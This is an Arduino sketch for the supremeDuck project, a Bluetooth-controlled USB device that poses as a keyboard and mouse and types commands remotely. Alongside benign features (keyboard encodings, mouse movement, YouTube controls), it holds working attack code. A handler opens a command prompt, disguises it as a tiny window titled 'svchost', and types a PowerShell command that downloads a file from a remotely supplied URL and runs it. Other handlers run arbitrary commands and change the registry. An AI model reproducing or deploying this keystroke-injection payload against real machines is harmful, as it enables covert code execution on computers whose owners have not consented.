
/*
supremeDuck project - https://github.com/michalmonday/supremeDuck
Created by Michal Borowski
*/


/* 
 *
 *  
 *  
 *  
 *  
 *  
 *  
 *  
 * 
 * 
 */

#define Version "1.03" // it is used to compare it with the app version to make sure that both of them are the same (if they're not the same it will be shown in the mobile app and update will be suggested, first implemented in version 1.03 so it won't give any notice for earlier versions)

#include <SoftwareSerial.h> // Allows com.munication between the Arduino and HC-06 module.
#include "Keyboard.h" // library which provides all the functions to emulate Human Interface Device
#include "Mouse.h" // the same as above
#include <EEPROM.h> // Electrically Erasable Programmable Read-Only Memory, it allows to save some values that will prevail even when the device is disconnected from power.
// ATMEGA 32U4 which is the chip on Arduino Pro Micro has 1024 bytes of EEPROM.

#define LOG_SAVED_ENCODING_EEPROM false
#define LOG_SERIAL false //setting to true makes mouse movement laggy if the serial monitor isn't open

#define HC_BAUDRATE 9600 //(default baud rate of hc-06) It's the speed of communication between Arduino and HC-06, it shouldn't be changed without additionally changing it on the HC-06.

/*
#define EEPROM_ADDRESS_TRIGGER_TRICK 0
trick = plug it in + plug out within 3 secs => special function is triggered(that special function is commented out in "setup" funciton)
*/

//To do: add comma check in app or solve the bug (if data received by arduino ends with ",,end" instead of standard ",end" arduino won't respond anymore)

//https://www.arduino.cc/en/Reference/KeyboardModifiers

//SoftwareSerial BTSerial(16, 15); // it could also work
SoftwareSerial BTSerial(9, 8); // RX | TX these are pins responsible for communication between the bluetooth module and arduino
//SoftwareSerial BTSerial(8, 9); // old pinout (less comfortable to solder, now only 1 of these devices has it this way)

#define MAX_SERIAL_LENGTH 200 // Maximum lenght of data received from the bluetooth module. If you'd like to make it greater than 255 make sure to replace "byte" with "int" inside every "for loop"
char inSerial[MAX_SERIAL_LENGTH]; //it will contain the text sent from bluetooth module and received in arduino

#define ENCODING_BYTE_DESIRED 0
#define ENCODING_BYTE_USED 1
#define ENCODING_BYTE_MODIFIER 2
#define ENCODING_SIZE 72

byte Encoding[3][ENCODING_SIZE] = { //definition only applies to new devices where encoding isn't saved at EEPROM yet. By default it's US keyboard encoding
  {0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F, 0x40, 0x41, 0x4D, 0x51, 0x57, 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F, 0x60, 0x61, 0x69, 0x6D, 0x71, 0x77, 0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E},
  {0x31, 0x22, 0x33, 0x34, 0x35, 0x37, 0x22, 0x39, 0x30, 0x38, 0x3D, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3B, 0x3B, 0x2C, 0x3D, 0x2E, 0x2F, 0x32, 0x61, 0x6D, 0x71, 0x77, 0x79, 0x7A, 0x5B, 0x5C, 0x5D, 0x36, 0x2D, 0x7E, 0x61, 0x69, 0x6D, 0x71, 0x77, 0x79, 0x7A, 0x5B, 0x5C, 0x5D, 0x7E},
  {0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x00, 0x81, 0x81, 0x81, 0x81, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x81, 0x00, 0x81, 0x00, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x00, 0x00, 0x00, 0x81, 0x81, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x81, 0x81, 0x81, 0x81}
}; //saved at EEPROM 1-100, 101-200, 201-300

#define EEPROM_ADDRESS_ENCODING_AVAILABLE 1016 // address at which "777" will be written when the device will receive its first instruction to use some other encoding than the default US
#define EEPROM_STARTING_ADDRESS_ENCODING_DESIRED 1 
#define EEPROM_STARTING_ADDRESS_ENCODING_USED 101
#define EEPROM_STARTING_ADDRESS_ENCODING_MODIFIER 201
bool useMultiLangWindowsMethod = true; // it's set to true but it will be reset after checking EEPROM which is done after turning on the device
#define EEPROM_ADDRESS_USE_MULTI_LANG_METHOD_WINDOWS 301
#define EEPROM_STARTING_ADDRESS_ENCODING_NAME 302

/*
 * keypad values copied from http://forum.arduino.cc/index.php?topic=266688.msg1880647#msg1880647
 * thanks to nickgammon's reply
 */

byte KEYPAD[10] = {
  234,
  225,
  226,
  227,
  228,
  229,
  230,
  231,
  232,
  233
};

unsigned long previousSendingTime = 0; // used for sending setting data updates to the phone (current keyboard encoding, multilang thing)
unsigned long lastOKsendingTime = 0;
char encodingName[30] = {"US"}; // it will store the name of the currently used language encoding so it can be sent and displayed on the application (e.g  US, UK - gb, Deutch - ger, etc.)

char commandLineObfuscationString[54] = "echo off & mode 20,1 & title svchost & color 78 & cls"; // line used to make the command prompt less visible

// setup function is a part of every Arduino sketch, it gets called once at the begining
void setup()
{
  BTSerial.begin(HC_BAUDRATE); // begin communication with the bluetooth module
  Keyboard.begin(); // begin emulating keyboard
  Mouse.begin(); // begin emulating mouse

  Serial.begin(9600); // begin serial communication so it's possible to use "Tools -> Serial Monitor" to see the debugging output

  /*
  //TRIGGER TRICK
  //plug in and out within 3 sec to trigger some action at the next plug in
  byte triggerDefault = 0;
  EEPROM.get(EEPROM_ADDRESS_TRIGGER_TRICK, triggerDefault);
  byte c =1;
  EEPROM.put(EEPROM_ADDRESS_TRIGGER_TRICK, c);
  if(triggerDefault == 1)
  {
    //action
  }

  delay(3000);
  c =0;
  EEPROM.put(EEPROM_ADDRESS_TRIGGER_TRICK, c);  
  */  

  //delay(10000);  
  SavedEncodingAvailabilityCheck(); //rewrites the default US encoding with the saved one
  SavedMultiLangMethodWindowsCheck(); //checks whether to use the alt+numpad method
}

// loop function is also a part of every Arduino sketch but gets called over again after it returns/finishes unlike "setup" function
void loop()
{ 
  byte i=0; 
  if (BTSerial.available() > 0) // check whether there's any data received by the bluetooth module
  {        
    unsigned long previousByteRec = millis(); unsigned long lastByteRec = millis(); // timing functions (needed for reliable reading of the BTserial)
    while (100 > lastByteRec - previousByteRec) // if no further character was received during 100ms then proceed with the amount of chars that were already received (notice that "previousByteRec" gets updated only if a new char is received)
    {      
      lastByteRec = millis();   
      while (BTSerial.available() > 0 && i < MAX_SERIAL_LENGTH-1) 
      {
        inSerial[i]=BTSerial.read(); i++; // read bluetooth data (copy it to an array)         
        if(i == 16) // mouse movement check (only if the bluetooth receives exactly 16 characters)
        {
          if(StrStartsWith(inSerial, "MM:") && StrEndsWith(inSerial, ",end")){if(LOG_SERIAL){Serial.println(inSerial);} inSerial[i]='\0'; MyFuncMouseMove(inSerial);i = 0;}//MM:L,U,3,1,end (mouse movement)}
        }
        previousByteRec = lastByteRec;
      }    
    }

    inSerial[i]='\0'; // end the string with 0
    if(LOG_SERIAL){Serial.write(inSerial);} //it's useful for checking what text arduino receives from android but it makes the mouse movement laggy if the serial monitor is closed
    Serial.write("\n"); // new line, btw "F()" function helps with memory management, instead of being saved in dynamic memory it gets saved in the larger storage
    Check_Protocol(inSerial);  // main checking function, all the functionality gets triggered there depending on what it received from the bluetooth module      
    BTSerial.print("OK"); // it wasn't necessary before, but the ducky script functionality requires the Arduino to say: "OK, I already typed the last line/key you've sent me, so you can send the next one", otherwise there would have to be a bigger delay   
    lastOKsendingTime = millis();
  }
  

  unsigned long lastSendingTime = millis(); // needed to measure time and check when the last chunk of data was sent to mobile phone (it's a part of 2-way communication)
  if(lastSendingTime - previousSendingTime > 2500) // send update to the mobile phone about the current language encoding and whether MultiLang method is used
  {
    if(lastSendingTime - lastOKsendingTime > 1000) // additional check - if "OK" has been sent during the last second then avoid sending this data, just in case if there was further communication incomming
    {
      previousSendingTime = lastSendingTime;
      char data[40];
      sprintf(data,"data=%i,%s,end", useMultiLangWindowsMethod,encodingName); //format string
      BTSerial.write(data); // send the data to the mobile app or any other bluetooth device that is connected to it right now
      for(byte i=0;i<40;i++){data[i]=0;} //reset "data" (idk if it's even necessary)
    }
  }
} 

void SavedMultiLangMethodWindowsCheck() // check whether the MultiLang method was used before the device turned off last time (access EEPROM by using function "EEPROM.get(address, my_var);")
{
  EEPROM.get(EEPROM_ADDRESS_USE_MULTI_LANG_METHOD_WINDOWS, useMultiLangWindowsMethod); //read from EEPROM (persistent memory of ATMEGA 32U4) to see whether it should use MultiLang method
  if(LOG_SERIAL)
  { 
    Serial.print(F("MultiLang method (Windows only) setting has been read from the EEPROM - "));
    if(useMultiLangWindowsMethod)
    {
      Serial.println(F("it's enabled."));
    }
    else
    {
      Serial.println(F("it's disabled."));
    }
  }
}

void SavedEncodingAvailabilityCheck() //rewrites the default US encoding with the one which was used last time and saved to EEPROM
{
  int numCheck; //this has to be changed to int and saved elsewhere in the EEPROM, it has to be certain value so it won't give false positives
  EEPROM.get(EEPROM_ADDRESS_ENCODING_AVAILABLE, numCheck);
  if(numCheck == 777)
  {
    for(byte i=0;i<3; i++)
    {
      for(byte offset=0; offset<ENCODING_SIZE; offset++)
      {
        EEPROM.get(offset+1+(ENCODING_SIZE*i), Encoding[i][offset]); //+1 because the 0 address holds trigger bool for tricky activation method
        if(LOG_SAVED_ENCODING_EEPROM)
        {
          Serial.print(Encoding[i][offset], HEX);
          Serial.print(F(","));
        }
      }

      if(LOG_SAVED_ENCODING_EEPROM){Serial.print("\n");}
    }

    EEPROM.get(EEPROM_STARTING_ADDRESS_ENCODING_NAME, encodingName);
  }
  else if(LOG_SAVED_ENCODING_EEPROM)
  {
    Serial.print(F("No encoding available"));
    Serial.print(F("\n"));
  }
}


void MyFuncMouseMove(char *inStr)
{
  char x;
  char y;

  //MM:L,U,FF,FF,end
  char strValBuff[3]={inStr[7],inStr[8],'\0'}; 
  x = (char)strtoul((char*)strtok(strValBuff, " "),NULL,16);
   
  strValBuff[0]=inStr[10]; 
  strValBuff[1]=inStr[11]; 
  y = (char)strtoul((char*)strtok(strValBuff, " "),NULL,16);
  
 //MM:L,U,FF,FF,end //left/right, up/down, horizontal value, vertical value
  if(inStr[3] == 'L'){x = x * -1;}
  if(inStr[5] == 'D'){y = y * -1;}       

  if(LOG_SERIAL){Serial.print("    x="); Serial.print((byte)x);Serial.print(", y=");Serial.print((byte)y);Serial.print("\n");}
  Mouse.move(x, y, 0);
  
  for(byte i=0;i<strlen(inStr);i++){inStr[i]=0;}
}

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void openRun()
{
  Keyboard.press(KEY_LEFT_GUI);
  delay(200);
  Keyboard.press('r');
  delay(200);
  Keyboard.releaseAll();
  delay(700);
}

void openCmd()
{
  openRun();  
  Print("cmd");
  typeKey(KEY_RETURN); 
}

void EnterCommand(char *text)
{
  Print(text);
  delay(10);
  typeKey(KEY_RETURN);  
}

void Check_Protocol(char *inStr)
{       
  if(!strcmp(inStr,"Enter")) // strcmp function compares the text received from bluetooth (inStr) with phrases that are expected to be received (e.g. "Enter", "Alt+F4")
  {    
    typeKey(KEY_RETURN);
  }

  if(!strcmp(inStr,"Alt+F4"))
  {    
    Keyboard.press(KEY_LEFT_ALT);
    delay(10);
    Keyboard.press(KEY_F4);
    delay(50);
    Keyboard.releaseAll();
  }

  if(!strcmp(inStr,"Increase font size"))
  {    
    Keyboard.press(KEY_LEFT_CTRL);
    delay(10);
    Keyboard.press(KEY_LEFT_SHIFT);
    delay(10);
    Keyboard.press('>');
    delay(50);
    Keyboard.releaseAll();  
  }

  if(!strcmp(inStr,"Decrease font size"))
  {    
    Keyboard.press(KEY_LEFT_CTRL);
    delay(10);
    Keyboard.press(KEY_LEFT_SHIFT);
    delay(10);
    Keyboard.press('<');
    delay(50);
    Keyboard.releaseAll();  
  }

  if(!strcmp(inStr,"Select all"))
  {    
    Keyboard.press(KEY_LEFT_CTRL);
    delay(10);
    Keyboard.press('a');
    delay(50);
    Keyboard.releaseAll();  
  }

  if(!strcmp(inStr,"Bold"))
  {    
    Keyboard.press(KEY_LEFT_CTRL);
    delay(10);
    Keyboard.press('b');
    delay(50);
    Keyboard.releaseAll();  
  }

  if(!strcmp(inStr,"Underline"))
  {    
    Keyboard.press(KEY_LEFT_CTRL);
    delay(10);
    Keyboard.press('u');
    delay(50);
    Keyboard.releaseAll();  
  }

  if(!strcmp(inStr,"click"))
  {    
    Mouse.click();
  }

  if(StrStartsWith(inStr, "DE:") && StrContains(inStr, ",type:") && StrEndsWith(inStr, ",end")) //DE:t,type:est,end (download and execute)
  {
    byte indexType = SubStrIndex(inStr, ",type:"); //trying to get the position where link is ending and the file type begins
    byte indexEnd = SubStrIndex(inStr, ",end"); //trying to get the position where the file type ends (to know its length)

    char fileFormat[10];
    byte typeLen = indexEnd - (indexType + strlen(",type:")); //get length
    for(byte i=0;i<=typeLen;i++)
    {
      fileFormat[i] = inStr[i+indexType+strlen(",type:")];
      
      if(i == typeLen){fileFormat[i] = '\0';}
    }
       
    for(byte i=0;i<=indexType-3;i++)//indexType - 3 which is "DE:" + 1
    {
      inStr[i] = inStr[i+3];
      
      if(i == indexType-3){inStr[i] = '\0';}
    }    
      
    openCmd(); //("powershell Start-Process cmd -Verb runAs");
    delay(500);
    EnterCommand(commandLineObfuscationString);
    
    Print("powershell \"$down = New-Object System.Net.WebClient; $url = '");
    Print(inStr);
    Print("'; $file = 'downloadedfile.");
    Print(fileFormat);
    Print("'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;\" & exit");
    typeKey(KEY_RETURN);
  }
  

  if(StrStartsWith(inStr, "YT:") && StrEndsWith(inStr, ",end")) //YT:t,end (Youtube)
  {
    ExtractDeliveredText(inStr, 3);
    
    openRun();
    //Print("www.youtube.com/embed/2Z4m4lnjxkY?rel=0&autoplay=1"); //trololo 2Z4m4lnjxkY  
    Print("www.youtube.com/embed/");
    Print(inStr);
    Print("?rel=0&autoplay=1");
    typeKey(KEY_RETURN);     
  }

  if(StrStartsWith(inStr, "YTB:") && StrEndsWith(inStr, ",end"))//youtube control buttons
  {
    ExtractDeliveredText(inStr, 4);
    if(StrContains(inStr, "PP")){Print(" ");}//pause/play
    else if(StrContains(inStr, "F5")){Keyboard.press(KEY_RIGHT_ARROW);}//forward 5s // change inc/vol to 10 sec if it doesn't work and use Print("l/j")
    else if(StrContains(inStr, "B5")){Keyboard.press(KEY_LEFT_ARROW);}//backward 5s
    else if(StrContains(inStr, "GB")){Keyboard.press(KEY_HOME);}//go to begining
    else if(StrContains(inStr, "GE")){Keyboard.press(KEY_END);}//go to end
    else if(StrContains(inStr, "CA")){Print("c");}//captions tog
    else if(StrContains(inStr, "IS")){Keyboard.press(KEY_LEFT_SHIFT); delay(50); Print(">");}//increase speed (may not work in all browsers)
    else if(StrContains(inStr, "DS")){Keyboard.press(KEY_LEFT_SHIFT); delay(50); Print("<");}//decrease speed
    else if(StrContains(inStr, "IV")){Keyboard.press(KEY_UP_ARROW);}//increase vol
    else if(StrContains(inStr, "DV")){Keyboard.press(KEY_DOWN_ARROW);}//decrease vol
    else if(StrContains(inStr, "PV")){Keyboard.press(KEY_LEFT_SHIFT); delay(50); Print("p");}//previous video (in a playlist)
    else if(StrContains(inStr, "NV")){Keyboard.press(KEY_LEFT_SHIFT); delay(50); Print("n");}//next video
    else if(StrContains(inStr, "FS")){Print("f");}//full screen tog
    else if(StrContains(inStr, "F11")){Keyboard.press(KEY_F11);}//full screen browser tog
    delay (70);
    Keyboard.releaseAll();
  }

  if(StrStartsWith(inStr, "WS:") && StrEndsWith(inStr, ",end")) //WS:t,end (website)
  {
    ExtractDeliveredText(inStr, 3);
    
    openRun();
    Print(inStr);
    typeKey(KEY_RETURN);     
  }

  if(StrStartsWith(inStr, "EP:") && StrEndsWith(inStr, ",end")) //EP:t,end (execute program)
  {
    ExtractDeliveredText(inStr, 3);
    
    openRun();
    Print(inStr);
    delay(100);
    typeKey(KEY_RETURN);  
  }

  if(StrStartsWith(inStr, "EC:") && StrEndsWith(inStr, ",end")) //EC:t,end (execute command)
  {
    ExtractDeliveredText(inStr, 3);
    
    openCmd();
    delay(500);
    EnterCommand(commandLineObfuscationString);
    Print(inStr);
    if(StrStartsWith(inStr, "cd \"%USERPROFILE%\\Desktop\" & FOR")){typeKey(KEY_RETURN); delay(50); Print("echo a");} //exception for a command which creates multiple files (otherwise only one file would be created, echo a is added because command " & exit" wouldn't close the window without something preceding it

    Print(" & exit");
    typeKey(KEY_RETURN);  
    delay(100);
  }

  //.

 
  
  if(StrStartsWith(inStr ,"PT:") && StrEndsWith(inStr, ",end")) //(direct text instruction)
  {
    ExtractDeliveredText(inStr, 3);
    Print(inStr);
  }

  if(StrStartsWith(inStr ,"TE:") && StrEndsWith(inStr, ",end")) //(direct text instruction but with enter at the end )
  {
    ExtractDeliveredText(inStr, 3);
    Print(inStr);
    delay(20);
    Keyboard.press(KEY_RETURN);
    delay(20);
    Keyboard.release(KEY_RETURN);
  }

  if(StrStartsWith(inStr, "ENC,") && StrEndsWith(inStr, ",end")) //(direct text instruction)
  {
    byte encodingFactor=255;
    switch (inStr[4]) //5th letter is D, U or M depending on the type of 3 encoding factors
    {
      case 'D':
        {
          encodingFactor=0;
        }     
        break;
        
      case 'U':
        {
          encodingFactor=1;  
        }
        break;
      case 'M':
        {
          encodingFactor=2; 
        }
        break;
      case 'N':
        {
          ExtractDeliveredText(inStr, 6);
          sprintf(encodingName, "%s\0", inStr);
          EEPROM.put(EEPROM_STARTING_ADDRESS_ENCODING_NAME, encodingName);
          EEPROM.put(EEPROM_ADDRESS_ENCODING_AVAILABLE, 777); //just to acknowledge that there's no need for the default US encoding becuase some other was saved to EEPROM
          for(byte i=0;i<MAX_SERIAL_LENGTH;i++){inStr[i]=0;}
          return;
        }
        break;
      default:
        {
          Serial.print(F("Error: Incorrect encoding factor."));
          return;
        }
        break;
    }   

    ExtractDeliveredText(inStr, 6);
    
    if(LOG_SAVED_ENCODING_EEPROM){Serial.print("Received:\n");}

    for(byte offset=0; offset<strlen(inStr); offset+=2)
    {
      byte strValBuff[3]={inStr[offset],inStr[offset+1],'\0'}; 

      Encoding[encodingFactor][offset/2] = (byte)strtoul((char*)strtok(strValBuff, " "),NULL,16);//(((byte)inStr[offset]) * 16) + (byte)inStr[offset+1];         

      if(LOG_SAVED_ENCODING_EEPROM)
      {
        Serial.print(Encoding[encodingFactor][offset/2], HEX);
        Serial.print(F("-"));
        Serial.print(offset);
        Serial.print(F("  "));       
      }
    }  
    
    if(LOG_SAVED_ENCODING_EEPROM){Serial.print(F("\nSaved to EEPROM:\n"));}

    //save to EEPROM
    for(byte offset=0; offset<ENCODING_SIZE; offset++)
    {
      Encoding[encodingFactor][offset] = ((offset<(strlen(inStr)/2)) ? Encoding[encodingFactor][offset] : 0);
      EEPROM.put(offset+1+(ENCODING_SIZE*encodingFactor), Encoding[encodingFactor][offset]); //+1 because the 0 address holds trigger bool for tricky activation method
      
      if(LOG_SAVED_ENCODING_EEPROM)
      {
        Serial.print(Encoding[encodingFactor][offset], HEX);
        Serial.print(F(","));
      }
    }

    if(LOG_SAVED_ENCODING_EEPROM){Serial.print(F("\n\n"));}
    
  } 

  if(StrStartsWith(inStr, "SW:") && StrContains(inStr, ",type:") && StrEndsWith(inStr, ",end")) //SW:t,type:est,end (download and set as a wallpaper)
  {
    byte indexType = SubStrIndex(inStr, ",type:"); //trying to get the position where link is ending and the file type begins
    byte indexEnd = SubStrIndex(inStr, ",end"); //trying to get the position where the file type ends (to know its length)

    char fileFormat[10];
    byte typeLen = indexEnd - (indexType + strlen(",type:")); //get length
    for(byte i=0;i<=typeLen;i++)
    {
      fileFormat[i] = inStr[i+indexType+strlen(",type:")];
      
      if(i == typeLen){fileFormat[i] = '\0';}
    }
       
    for(byte i=0;i<=indexType-3;i++)//indexType - 3 which is "SW:" + 1
    {
      inStr[i] = inStr[i+3];
      
      if(i == indexType-3){inStr[i] = '\0';}
    }    
      
    openCmd(); //("powershell Start-Process cmd -Verb runAs");
    delay(500);
    EnterCommand(commandLineObfuscationString);
    
    Print("powershell \"$down = New-Object System.Net.WebClient; $url = '");
    Print(inStr);
    Print("'; $file = 'downloadedfile.");
    Print(fileFormat);
    Print("'; $down.DownloadFile($url,$file); exit;\" & reg add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d C:\\Users\\%USERNAME%\\downloadedfile.");
    Print(fileFormat);
    Print(" /f & RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters & exit");
    typeKey(KEY_RETURN);
  }

  if(StrStartsWith(inStr ,"ML:") && StrEndsWith(inStr, ",end")) //(direct text instruction)
  {
    ExtractDeliveredText(inStr, 3);
    
    if(!strcmp(inStr,"Enabled"))
    {
      useMultiLangWindowsMethod = true;
      EEPROM.put(EEPROM_ADDRESS_USE_MULTI_LANG_METHOD_WINDOWS, true);
      if(LOG_SERIAL){Serial.println(F("MultiLang method (Windows only) has been enabled."));}
    }
    else if(!strcmp(inStr,"Disabled")) 
    {
      useMultiLangWindowsMethod = false;
      EEPROM.put(EEPROM_ADDRESS_USE_MULTI_LANG_METHOD_WINDOWS, false);
      if(LOG_SERIAL){Serial.println(F("MultiLang method (Windows only) has been disabled."));}
    }
  }



  //ducky script
  //*  PDK_HC:FF,a,end    // Press double key _ hex + char
  //*  PDK_HH:FF,FF,end   // Press double key _ hex + hex
  //*  PK:a,end  // Press key char
  //*  PKH:FF,end // Press key hex
  //*  WAIT:5000,end // delay(5000);
  if(StrStartsWith(inStr,"PDK_HC:") && StrEndsWith(inStr, ",end"))
  {
    ExtractDeliveredText(inStr, 7);
    inStr[4] = 0;
    
    Keyboard.press(HexToChar(inStr));
    delay(5);
    //Print(inStr[3]);
    Keyboard.press(inStr[3]);
    delay(5);
    Keyboard.releaseAll();  
  }

  if(StrStartsWith(inStr,"PDK_HH:") && StrEndsWith(inStr, ",end"))
  {
    ExtractDeliveredText(inStr, 7);
    char key_1 = HexToChar(inStr);
    char key_2[2] = {HexToChar(inStr+2),"/0"}; 
    Keyboard.press(key_1);
    delay(5);
    //Print(key_2);
    Keyboard.press(key_2);
    delay(5);
    Keyboard.releaseAll();   
  }

  if(StrStartsWith(inStr,"PK:") && StrEndsWith(inStr, ",end"))
  {
    ExtractDeliveredText(inStr, 3);
    inStr[1] = 0;
    Print(inStr[0]);
  }

  if(StrStartsWith(inStr,"PKH:") && StrEndsWith(inStr, ",end"))
  {
    ExtractDeliveredText(inStr, 4);
    char key[2] = {HexToChar(inStr), '\0'};
    Print(key);
  }

  if(StrStartsWith(inStr,"WAIT:") && StrEndsWith(inStr, ",end"))
  {
    ExtractDeliveredText(inStr, 5);
    int val;
    sscanf(inStr, "%i", &val);
    delay(val);
  }


  if(!strcmp(inStr, "VER")) // it means that the mobile phone app asks what version of the code is used on Arduino, to make sure that the same it's not different from the mobile app
  {
    char data[13];
    sprintf(data,"ver=%s,end", Version); //format string
    BTSerial.write(data); // send the data to the mobile app or any other bluetooth device that is connected to it right now
    for(byte i=0;i<13;i++){data[i]=0;} //reset "data" (idk if it's even necessary)
  }


  
  for(byte i=0;i<MAX_SERIAL_LENGTH;i++){inStr[i]=0;}
}

/*
ENC,D:2122232425262728292A2B2C2D2E2F303132333435363738393A3B3C3D3E3F40414D5157595A5B5C5D5E5F6061696D7177797A7B7C7D7E,end
ENC,U:317E333435373238392D345C3D2F37303132333435363738392F5C2C302E2D71616D7177797A382D39333D5C61226D7177797A375C305D,end
ENC,M:81008686818181818100810000008100000000000000000000818181818181868181818181818686868181860000000000000086818686,end
ENC,N:UK - gb,end
*/

void ExtractDeliveredText(char *inStr, byte ignoredStartingChars) //gets rid of the first few chars (e.g. "YT:") and the ",end" (it assumes that every message received ends with ",end", if the message would end like ",ending" the function won't work properly without adding additional parameter, somthing like: "byte ignoredEndingChars")
{
  byte len = SubStrIndex(inStr, ",end") - ignoredStartingChars;      
   
  for(byte i=0;i<=len;i++)
  {
    inStr[i] = inStr[i+ignoredStartingChars];
    if(i == len)
    {
      inStr[i] = '\0';
    }
  }
}

int SubStrIndex(char *str, char *sfind)
{
    byte found = 0;
    byte index = 0;
    byte len = strlen(str);
   
    if (strlen(sfind) > len) 
    {
        return 0;
    }
    
    while (index < len) 
    {                
        if (str[index] == sfind[found]) 
        {
            found++;
            if (strlen(sfind) == found) 
            {
                index = index - strlen(sfind) + 1;               
                return index;
            }
        }
        else{found = 0;}   
           
        index++;
    }

    return 0;
}

bool StrContains(char *str, char *sfind)
{
    byte found = 0;
    byte index = 0;
    byte len;

    len = strlen(str);
    
    if (strlen(sfind) > len) {return false;}
    
    while (index < len) 
    {
        if (str[index] == sfind[found]) 
        {
            found++;
            if (strlen(sfind) == found) {return true;}
        }
        else {found = 0;}
        
        index++;
    }
    return false;
}

bool StrStartsWith(char* str, char* desiredStart)
{
  if(strlen(desiredStart)>strlen(str)){return false;}
  
  byte matching = 0;
  for(byte i=0; i < strlen(desiredStart); i++)  
    if(str[i] == desiredStart[i])    
      matching++;
      
  if(matching == strlen(desiredStart))  
    return true;
  
  return false;
}

bool StrEndsWith(char* str, char* desiredEnd)
{
  if(strlen(desiredEnd)>strlen(str))
  {
    return false;
  }
  byte matching = 0;
  byte desiredEndLen = strlen(desiredEnd);
  byte baseStrLen = strlen(str);
  for(byte i=0;i<strlen(desiredEnd);i++)
  {
    if(str[baseStrLen - desiredEndLen + i] == desiredEnd[i]){matching++;}
  }
  
  if(matching == desiredEndLen){return true;}
  
  return false;
}



void Print(char *inStr)
{
  //Print_WinMultiLangCHAR_PTR(inStr);
  //return;
   
  int enc_index; 
  for(byte i=0; i<strlen(inStr); i++)//for each character in the string
  {  
    if (useMultiLangWindowsMethod && !IsModifier(inStr[i]) && ((!isalnum(inStr[i]) && inStr[i] != ' ') || IsException(inStr[i]))) //if character is punctuation or requires different button to be pressed in different keyboard language settings then use alt+numpad method
    //if(IsCharSpecial(inStr[i]))
    {
      //Serial.print("special char = ");
      //Serial.println(inStr[i]);
      
      byte hundreds = (byte)inStr[i] / 100;
      byte dozens = ((byte)inStr[i] - (hundreds*100)) / 10;
      byte singles = (byte)inStr[i] - (hundreds*100) - (dozens*10);

      /*
      Serial.print(hundreds);
      Serial.print(dozens);
      Serial.println(singles);
      */
    
      Keyboard.press(KEY_LEFT_ALT);
      PressRelease((char)KEYPAD[hundreds], 5);
      PressRelease((char)KEYPAD[dozens], 5);
      PressRelease((char)KEYPAD[singles], 5);
      Keyboard.releaseAll();
      continue;
    }
  
    
    enc_index = GetKeyIndex(inStr[i], Encoding[ENCODING_BYTE_DESIRED]);
    if(enc_index < 256) //256 means it's a key not present in the array (key which does not need a substitution because it is the same for any keyboard setting)
    {    
      if(Encoding[ENCODING_BYTE_MODIFIER][enc_index] > 0)
      {
        Keyboard.press(Encoding[ENCODING_BYTE_MODIFIER][enc_index]);
        delay(5);
      }

      Keyboard.press(Encoding[ENCODING_BYTE_USED][enc_index]);
      delay(5);     

      /*
      Serial.print(inStr[i]);
      Serial.print(", ");
      Serial.print(Desired_Keys[enc_index]);
      Serial.print(", ");
      Serial.print(Modifier_Keys[enc_index]);
      Serial.print(", ");
      Serial.print(Used_Keys[enc_index]);
      Serial.print(", ");
      Serial.print("\n");
      */
      
    }
    else // if the standard/normal key can be pressed
    {
      Keyboard.press(inStr[i]);
      //Serial.print(", ");
      //Serial.println(inStr[i]);
      delay(5);     
    }
    Keyboard.releaseAll();
  }
}

int GetKeyIndex(byte c, byte* char_array) // find and the position of the value in the array
{
  for(byte i=0;i<strlen(char_array);i++)
  {
    if(c == char_array[i])
    {
      return i;
    }
  }
  return 256;
}


/*
void Print_WinMultiLangCHAR_PTR(char *inStr)
{
  for(byte i=0; i<strlen(inStr); i++)//for each character in the string
  {
    byte hundreds = (byte)inStr[i] / 100;
    byte dozens = ((byte)inStr[i] - (hundreds*100)) / 10;
    byte singles = (byte)inStr[i] - (hundreds*100) - (dozens*10);

    Keyboard.press(KEY_LEFT_ALT);
    PressRelease((char)KEYPAD[hundreds], 5);
    PressRelease((char)KEYPAD[dozens], 5);
    PressRelease((char)KEYPAD[singles], 5);
    Keyboard.releaseAll();
  }
}

void Print_WinMultiLangSTR(String inStr)
{
  for(byte i=0; i<inStr.length(); i++)//for each character in the string
  {
    byte hundreds = (byte)inStr.charAt(i) / 100;
    byte dozens = ((byte)inStr.charAt(i) - (hundreds*100)) / 10;
    byte singles = (byte)inStr.charAt(i) - (hundreds*100) - (dozens*10);

    Keyboard.press(KEY_LEFT_ALT);
    PressRelease((char)KEYPAD[hundreds], 5);
    PressRelease((char)KEYPAD[dozens], 5);
    PressRelease((char)KEYPAD[singles], 5);
    Keyboard.releaseAll();
  }
}

*/

void PressRelease(char c, byte timeDelay)
{
  Keyboard.press(c);
  delay(timeDelay);
  Keyboard.release(c);
}


/*
Exceptions are the letters that require different button being pressed in different lang settings 
(so if letter == exception then use alt+numpad method, otherwise use the normal typing because it's faster to press 1 instead of 4 buttons) 
these exceptions are listed to make the typing process faster because using alt+numpad method for all the characters appears to be too slow

german - yz
french - qamwz
dutch - qamwz
turkish - i
azerbaijani - totally uncompatible
*/

#define EXCEPTIONS_SIZE 14
char exceptions[EXCEPTIONS_SIZE] = {
  'y','Y',
  'z','Z',
  'q','Q',
  'a','A',
  'm','M',
  'w','W',
  'i','I',
};

/*
bool IsCharSpecial(char c)
{
  byte b = (byte)c;
  if((b == 32 || (b >= 49 && b <= 57) || (b >= 65 && b <= 90) || (b >= 97 && b <= 122)) && IsntException(b))
  {
    return false;
  }
  return true;
}
